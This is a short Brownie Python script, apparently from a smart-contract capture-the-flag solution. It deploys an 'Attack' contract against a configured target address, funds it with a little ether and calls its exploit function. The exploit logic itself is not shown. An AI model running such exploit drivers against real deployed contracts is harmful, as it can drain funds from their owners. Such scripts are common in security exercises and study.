from brownie import Attack, network, config
from scripts.helpful import get_account


def exploit():
    # Get account address
    account = get_account()
    # Deploying attack contract
    attack = Attack.deploy(config["Address"], {"from": account})
    # transferring some ether to the deployed account
    account.transfer(attack.address, "0.0001 ether")
    # running the exploit
    tx = attack.exploit({"from": account})
    tx.wait(1)
    print("Exploited")


def main():
    exploit()
